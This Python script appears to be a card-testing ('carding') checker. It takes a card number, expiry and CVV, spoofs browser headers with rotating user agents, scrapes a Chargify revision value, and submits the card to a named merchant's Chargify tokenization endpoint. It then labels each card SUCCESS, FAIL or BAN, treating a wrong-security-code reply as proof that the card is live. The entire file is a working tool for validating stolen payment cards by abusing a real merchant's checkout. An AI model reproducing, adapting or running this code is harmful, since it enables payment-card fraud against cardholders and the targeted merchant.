from __future__ import annotations
import os, uuid, random

from flowlite import Flow, step, finalize, expect, http, js
from flowlite.plugins import CurlDump, MaskCookies


flow = Flow("chargify").debug(trace=True)

# Bật plugin log để dễ debug/replay
LOG_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "logs", "curl"))
flow.use(MaskCookies)
#flow.use(CurlDump, dir=LOG_DIR, include_response=True, split_by_flow=True)

@step("init_input")
def init_input(ctx):
    d = ctx.data or {}
    ctx.ccnum = str(d.get("CCNUM", "")).replace(" ", "")
    ctx.mm    = str(d.get("MM", ""))
    ctx.yyyy  = str(d.get("YYYY", ""))
    ctx.ccv   = str(d.get("CCV", ""))

    expect.truthy(ctx.ccnum, "CCNUM required")
    expect.truthy(ctx.mm, "MM required")
    expect.truthy(ctx.yyyy, "YYYY required")
    expect.truthy(ctx.ccv, "CCV required")


@step("random_user_agent")
def random_user_agent(ctx):
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/133 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    ]
    ctx.ua = random.choice(uas)


@step("fetch_main_iframe_js")
def fetch_main_iframe_js(ctx):
    url = "https://js.chargify.com/latest/main-iframe.js"
    r = (http.get(url)
           .header("accept-language", "en-US,en;q=0.9")
           .header("sec-ch-ua", '"Chromium";v="139", "Not;A=Brand";v="99"')
           .user_agent(ctx.ua)
           .header("sec-ch-ua-mobile", "?0")
           .accept("*/*")
           .header("sec-fetch-site", "same-origin")
           .header("sec-fetch-mode", "no-cors")
           .header("sec-fetch-dest", "script")
           .header("sec-fetch-storage-access", "active")
           .referer("https://js.chargify.com/latest/main-iframe.html")
           .header("accept-encoding", "gzip, deflate, br")
           .label("chargify-main-iframe.js")
           .via_tls()
           .timeout(60.0)
           .send())

    t = r.text() or ""
    ctx.revision = http.re(r'revision:"([^"]+)"', t, 1)


@step("run_chargify_js")
def run_chargify_js(ctx):
    out = js.run("flows/js/chargify.js", {
        "CCNUM": ctx.ccnum,
        "MM": ctx.mm,
        "YYYY": ctx.yyyy,
        "CCV": ctx.ccv,
    }, expect="json", timeout=15.0)
    ctx.result = (out or {}).get("result")


@step("post_chargify_token")
def post_chargify_token(ctx):
    url = "https://foundr-media.chargify.com/js/tokens.json"
    payload = {
        "key": "chjs_2gszs99mxy2rt47fzcpsmzjp",
        "revision": ctx.revision,
        "credit_card": {
            "full_number": ctx.ccnum,
            "expiration_month": ctx.mm,
            "expiration_year": ctx.yyyy,
            "cvv": ctx.ccv,
            "device_data": "",
            "gateway_handle": "stripe-us",
        },
        "origin": "https://checkout.foundr.com",
        "h": ctx.result,
    }

    r = (http.post(url)
           .content_type("application/json")
           .header("accept-language", "en-US,en;q=0.9")
           .header("sec-ch-ua-mobile", "?0")
           .user_agent(ctx.ua)
           .accept("*/*")
           .header("origin", "https://js.chargify.com")
           .header("sec-fetch-site", "same-site")
           .header("sec-fetch-mode", "cors")
           .header("sec-fetch-dest", "empty")
           .referer("https://js.chargify.com/")
           .header("accept-encoding", "gzip, deflate, br")
           .header("priority", "u=1, i")
           .header("connection", "keep-alive")
           .label("chargify-token")
           .via_tls()
           .json(payload)
           .timeout(60.0)
           .send())

    ctx.token_status = r.status
    body = r.text() or ""
    ctx.token_body = body[:512]
    # Parse token/errors nếu có
    ctx.chargify_token = http.re(r'"token"\s*:\s*"(tok[^"]+)"', body, 1)
    ctx.tok = http.re(r'"token"\s*:\s*"([^"]+)"', body, 1)
    ctx.errors_site = http.re(r'"errors"\s*:\s*"([^"]+)"', body, 1)

    # Đánh giá kết quả
    fail_markers = [
        "Your card does not support this type of purchase",
        "Credit card number: must be a valid credit card number",
        "Your card number is incorrect",
        "Your card was declined",
        "cannot be expired",
        "expiration year is invalid"
    ]
    if any(m in body for m in fail_markers):
        ctx.status = "FAIL"
        print(f"DEBUG - Chargify status: {ctx.status}")
    elif (ctx.chargify_token and ctx.chargify_token.startswith("tok")) or ("security code is incorrect" in body) or ("security code is invalid" in body):
        ctx.status = "SUCCESS"
        print(f"DEBUG - Chargify status: {ctx.status}")
    else:
        print(f"DEBUG - Chargify body: {body}")
        print(f"DEBUG - Chargify status: {ctx.status}")
        ctx.status = "BAN"
        raise AssertionError("BAN")



@finalize
def done(ctx):
    return {
        "status": ctx.status,
        "tok": ctx.tok,
        "errors_site": ctx.errors_site,
    }


flow.register(globals())

if __name__ == "__main__":
    import json
    out = flow.run(data={}, session={}, options={})
    print(json.dumps(out, ensure_ascii=False, indent=2))


